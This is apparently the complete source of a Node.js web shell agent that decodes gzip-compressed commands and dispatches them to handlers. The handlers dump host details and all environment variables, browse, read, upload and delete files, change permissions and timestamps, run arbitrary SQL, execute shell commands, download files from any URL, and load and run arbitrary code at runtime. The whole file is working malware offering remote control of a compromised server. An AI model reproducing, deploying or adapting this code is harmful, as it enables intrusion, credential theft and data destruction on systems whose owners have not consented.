(function () {
    return {
        sessionTable: {},
        parseParams(buffer) {
            const params = {};
            const keyBuf = [];
            let i = 0;
            while (i < buffer.length) {
                const b = buffer[i++];
                if (b === 0xFF) break;
                if (b === 0x02) {
                    const key = Buffer.from(keyBuf).toString('utf8');
                    keyBuf.length = 0;
                    const len = buffer.readUInt32LE(i);
                    i += 4;
                    params[key] = buffer.slice(i, i + len);
                    i += len;
                } else {
                    keyBuf.push(b);
                }
            }
            return params;
        },

        ctx(params) {
            return {
                get: (k) => params[k]?.toString('utf8') ?? null,
                getBytes: (k) => params[k] ?? null,
                params,
                getSession: () => this.sessionTable
            };
        },

        async test() {
            return 'ok';
        },

        async getBasicsInfo() {
            let text = '';
            const os = await import('os');
            const fs = await import('fs');

            let fileRoot = '';
            const isWindows = os.platform().indexOf('win') === 0;

            if (!isWindows) {
                fileRoot = '/';
            } else {
                const drivers = ['C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'];

                for (let i = 0; i < drivers.length; i++) {
                    const drive = drivers[i] + ':\\';
                    try {
                        if (fs.existsSync(drive)) {
                            fileRoot += drive + ';';
                        }
                    } catch (_) {
                    }
                }

                if (fileRoot === '') {
                    fileRoot = '/'
                }
            }

            text += 'FileRoot : ' + fileRoot + '\n';

            text += 'CurrentDir : ' + process.cwd() + '\n';
            text += 'CurrentWebDir : ' + process.cwd() + '\n';

            text += 'OsInfo : ' + os.type() + ' ' + os.release() + ' ' + process.arch + '\n';
            text += 'CurrentUser : ' + (process.env.USER || process.env.USERNAME || 'unknown') + '\n';
            text += 'ProcessArch : ' + (process.arch.indexOf('64') >= 0 ? 'x64' : 'x86') + '\n';

            try {
                const path = await import('path');
                let temp = os.tmpdir();
                const sep = path.sep;
                if (!temp.endsWith(sep)) temp += sep;
                text += 'TempDirectory : ' + temp + '\n';
            } catch {
                text += 'TempDirectory : c:/windows/temp/\n';
            }


            try {
                const nets = os.networkInterfaces();
                const ips = [];
                for (const k in nets) {
                    const arr = nets[k];
                    for (let i = 0; i < arr.length; i++) {
                        const item = arr[i];
                        if (item.family === 'IPv4' && !item.internal) {
                            ips.push(item.address);
                        }
                    }
                }
                text += 'IPList : [' + ips.join(', ') + ']\n';
            } catch (e) {
                text += 'IPList : ' + e.message + '\n';
            }


            const envMap = {
                CommandLine: process.argv.join(' '),
                CurrentDirectory: process.cwd(),
                MachineName: os.hostname(),
                ProcessorCount: os.cpus().length,
                UserName: process.env.USER || process.env.USERNAME || 'unknown',
                OSVersion: os.type() + ' ' + os.release(),
                Version: process.versions.node,
                Is64BitProcess: process.arch.indexOf('64') >= 0,
                Is64BitOperatingSystem: process.arch.indexOf('64') >= 0,
                TickCount: Math.floor(process.uptime() * 1000),
                WorkingSet: process.memoryUsage().rss
            };

            for (const k in envMap) {
                const v = envMap[k];
                if (k !== 'StackTrace' && k !== 'NewLine' && v != null) {
                    text += k + ' : ' + v + '\n';
                }
            }

            try {
                for (const k in process.env) {
                    text += k + ' : ' + process.env[k] + '\n';
                }
            } catch (e) {
                text += 'EnvVars error: ' + e.message + '\n';
            }

            return text;
        },

        async getFile(ctx) {
            const fs = await import('fs/promises');
            const C = (await import('fs')).constants;
            const path = await import('path');

            const dir = path.resolve(ctx.get('dirName') || '.');
            const list = await fs.readdir(dir);

            let out = "ok\n" + dir + "\n";

            for (const f of list) {
                const fp = path.join(dir, f);
                const st = await fs.stat(fp);

                const t = st.isDirectory() ? 0 : 1;
                const sz = !t ? 4096 : st.size;
                const mt = st.mtime.toISOString().slice(0, 19).replace('T', ' ');
                let perm = '';

                try {
                    await fs.access(fp, C.R_OK);
                    perm += "R"
                } catch {
                }
                try {
                    await fs.access(fp, C.W_OK);
                    perm += "W"
                } catch {
                }
                try {
                    await fs.access(fp, C.X_OK);
                    perm += "X"
                } catch {
                }
                if (perm === '') {
                    perm = 'F';
                }


                out += f + "\t" + t + "\t" + mt + "\t" + sz + "\t" + perm + "\n";
            }

            return out;
        }, async setFileAttr(ctx) {
            const fs = await import('fs');
            const fsp = await import('fs/promises');

            const type = ctx.get('type');
            const attr = ctx.get('attr');
            const fileName = ctx.get('fileName');

            if (!type || !attr || !fileName) {
                return 'type or attr or fileName is null';
            }

            if (type === 'fileBasicAttr') {
                try {
                    function convertFilePermissions(fileAttr) {
                        let mod = 0;

                        if (fileAttr.indexOf('R') !== -1) {
                            mod += 0o444;
                        }
                        if (fileAttr.indexOf('W') !== -1) {
                            mod += 0o222;
                        }
                        if (fileAttr.indexOf('X') !== -1) {
                            mod += 0o111;
                        }

                        return mod;
                    }

                    const perm = convertFilePermissions(attr);
                    await fsp.chmod(fileName, perm);
                    return 'ok';
                } catch (e) {
                    return 'fail';
                }
            }

            if (type === 'fileTimeAttr') {
                try {
                    const ts = Number(attr);
                    const date = new Date(ts * 1000);

                    await fsp.utimes(fileName, date, date);
                    return 'ok';
                } catch (e) {
                    return 'fail';
                }
            }

            return 'no ExcuteType';
        }, async execSql(ctx) {
            const dbType = ctx.get('dbType');
            const dbHost = ctx.get('dbHost');
            const dbPort = ctx.get('dbPort');
            const dbUsername = ctx.get('dbUsername');
            const dbPassword = ctx.get('dbPassword');
            const execType = ctx.get('execType');
            const execSqlStr = ctx.get('execSql');
            const currentDb = ctx.get('currentDb');

            if (!dbType || !dbHost || !dbPort || !dbUsername || !dbPassword || !execType || !execSqlStr) {
                return Buffer.from("No parameter dbType,dbHost,dbPort,dbUsername,dbPassword,execType,execSql");
            }

            try {
                let conn = null;
                let mysqlDriver = null;

                if (dbType === "mysql") {
                    try {
                        mysqlDriver = await import('mysql2/promise');
                    } catch (e) {
                        if (e.code === 'MODULE_NOT_FOUND') {
                            mysqlDriver = await import('mysql');
                        } else {
                            return Buffer.from(e.message);
                        }
                    }

                    if (mysqlDriver.createConnection) {
                        conn = await mysqlDriver.createConnection({
                            host: dbHost,
                            port: Number(dbPort),
                            user: dbUsername,
                            password: dbPassword
                        });
                    } else {
                        const raw = mysqlDriver.createConnection({
                            host: dbHost,
                            port: Number(dbPort),
                            user: dbUsername,
                            password: dbPassword
                        });
                        raw.connect();
                        conn = {
                            execute(sql) {
                                return new Promise(function (resolve, reject) {
                                    raw.query(sql, function (err, rows, fields) {
                                        if (err) reject(err);
                                        else resolve([rows, fields || []]);
                                    });
                                });
                            },
                            close() {
                                raw.end();
                            }
                        };
                    }
                }

                else if (dbType === "postgresql") {
                    const pg = await import('pg');
                    const Client = pg.Client;
                    conn = new Client({
                        host: dbHost,
                        port: Number(dbPort),
                        user: dbUsername,
                        password: dbPassword,
                        database: currentDb && currentDb.trim() !== '' ? currentDb : undefined
                    });
                    await conn.connect();
                }

                else if (dbType === "sqlite") {
                    let sqlite3 = null;

                    try {
                        sqlite3 = await import('sqlite3').verbose();
                    } catch (e) {
                        return Buffer.from("sqlite3 module not found");
                    }

                    const db = new sqlite3.Database(dbHost);
                    conn = {
                        all(sql) {
                            return new Promise(function (resolve, reject) {
                                db.all(sql, function (err, rows) {
                                    err ? reject(err) : resolve(rows);
                                });
                            });
                        },
                        run(sql) {
                            return new Promise(function (resolve, reject) {
                                db.run(sql, function (err) {
                                    err ? reject(err) : resolve(this.changes);
                                });
                            });
                        },
                        close() {
                            db.close();
                        }
                    };
                } else {
                    return Buffer.from("no " + dbType + " Dbtype");
                }

                if (execType === "select") {
                    let rows = [];
                    let fields = [];

                    if (dbType === "mysql") {
                        const result = await conn.execute(execSqlStr);
                        rows = result[0];
                        fields = result[1].map(function (f) {
                            return f.name;
                        });
                    } else if (dbType === "postgresql") {
                        const result = await conn.query(execSqlStr);
                        rows = result.rows;
                        fields = result.fields.map(function (f) {
                            return f.name;
                        });
                    } else if (dbType === "sqlite") {
                        rows = await conn.all(execSqlStr);
                        fields = rows.length > 0 ? Object.keys(rows[0]) : [];
                    }

                    let out = "ok\n";

                    for (let i = 0; i < fields.length; i++) {
                        out += Buffer.from(fields[i]).toString('base64') + "\t";
                    }
                    out += "\n";

                    for (let r = 0; r < rows.length; r++) {
                        const row = rows[r];
                        for (let c = 0; c < fields.length; c++) {
                            const val = row[fields[c]] == null ? "" : String(row[fields[c]]);
                            out += Buffer.from(val).toString('base64') + "\t";
                        }
                        out += "\n";
                    }

                    if (conn.close) conn.close();
                    if (conn.end) await conn.end();

                    return Buffer.from(out);
                }

                let affected = 0;

                if (dbType === "mysql") {
                    const result = await conn.execute(execSqlStr);
                    affected = result[0].affectedRows;
                } else if (dbType === "postgresql") {
                    const result = await conn.query(execSqlStr);
                    affected = result.rowCount;
                } else if (dbType === "sqlite") {
                    affected = await conn.run(execSqlStr);
                }

                if (conn.close) conn.close();
                if (conn.end) await conn.end();

                return Buffer.from("Query OK, " + affected + " rows affected");
            } catch (e) {
                return Buffer.from(e.message);
            }
        }, async readFile(ctx) {
            const fs = await import('fs/promises');
            return await fs.readFile(ctx.get('fileName'));
        },

        async uploadFile(ctx) {
            const fs = await import('fs/promises');
            await fs.writeFile(ctx.get('fileName'), ctx.getBytes('fileValue'));
            return 'ok';
        },

        async deleteFile(ctx) {
            const fs = await import('fs/promises');
            await fs.rm(ctx.get('fileName'), {recursive: true, force: true});
            return 'ok';
        },

        async copyFile(ctx) {
            const fs = await import('fs/promises');
            await fs.copyFile(ctx.get('srcFileName'), ctx.get('destFileName'));
            return 'ok';
        },

        async moveFile(ctx) {
            const fs = await import('fs/promises');
            await fs.rename(ctx.get('srcFileName'), ctx.get('destFileName'));
            return 'ok';
        },

        async newFile(ctx) {
            const fs = await import('fs/promises');
            await fs.writeFile(ctx.get('fileName'), '');
            return 'ok';
        },

        async newDir(ctx) {
            const fs = await import('fs/promises');
            await fs.mkdir(ctx.get('dirName'), {recursive: true});
            return 'ok';
        },

        async execCommand(ctx) {
            const {promisify} = await import('util');
            const {exec} = await import('child_process');
            const cmd = ctx.get('executableFile') || ctx.get('cmd') || '';
            const args = ctx.get('executableArgs') || '';
            const {stdout, stderr} = await promisify(exec)(`${cmd} ${args}`, {
                timeout: 60000, maxBuffer: 10 * 1024 * 1024
            });
            return stdout + stderr;
        },

        async fileRemoteDown(ctx) {
            const http = await import('http');
            const https = await import('https');
            const fs = await import('fs');
            const url = ctx.get('url'), save = ctx.get('saveFile');
            const client = url.startsWith('https:') ? https : http;
            return new Promise(r => {
                client.get(url, {timeout: 30000}, res => {
                    if (res.statusCode !== 200) {
                        res.resume();
                        return r(`http ${res.statusCode}`);
                    }
                    const ws = fs.createWriteStream(save);
                    res.pipe(ws);
                    ws.on('finish', () => r('ok'));
                }).on('error', e => r(e.message));
            });
        },

        async include(ctx) {
            const pluginObj = new Function(ctx.get('binCode'))();
            if (typeof pluginObj !== "object") {
                return 'plugin return await imports object';
            }

            ctx.getSession()[ctx.get('codeName')] = pluginObj;
            return 'ok';
        },

        async close(ctx) {
            const session = ctx.getSession();
            Object.keys(session.forEach(k => delete session[k]));
            return 'ok';
        },

        async bigFileUpload(ctx) {
            const fs = await import('fs');
            const name = ctx.get('fileName'), data = ctx.getBytes('fileContents');
            const pos = parseInt(ctx.get('position') || '0', 10);
            return new Promise(r => {
                fs.open(name, 'a', (e, fd) => {
                    fs.write(fd, data, 0, data.length, pos, () => {
                        fs.close(fd, () => r('ok'));
                    });
                });
            });
        },

        async process(raw) {
            const {gunzipSync, gzipSync} = await import("zlib");

            try {
                const decompressed = gunzipSync(raw);

                const params = this.parseParams(decompressed);
                const ctx = this.ctx(params);

                const methodName = ctx.get("methodName");
                const className = ctx.get("evalClassName");

                let handler = async () => "method not found";
                let handlerSelf = this;

                if (!className) {
                    if (typeof this[methodName] === "function") {
                        handler = this[methodName];
                    }
                } else {
                    const pluginObj = ctx.getSession()[className];

                    if (pluginObj && (typeof pluginObj === "object" || typeof pluginObj === "function")) {

                        handlerSelf = pluginObj;

                        if (typeof pluginObj[methodName] === "function") {
                            handler = pluginObj[methodName];
                        } else {
                            handler = async () => "method not found";
                        }
                    } else {
                        handler = async () => "code not load";
                    }
                }

                if (typeof handler !== "function") {
                    return gzipSync(Buffer.from("method not found"));
                }

                const result = await handler.call(handlerSelf, ctx);

                const payload = Buffer.isBuffer(result)
                    ? result
                    : Buffer.from(String(result ?? ""));

                return gzipSync(payload);

            } catch (e) {
                const msg = e.message || e.toString();
                return gzipSync(Buffer.from("error: " + msg));
            }
        }

    };
})()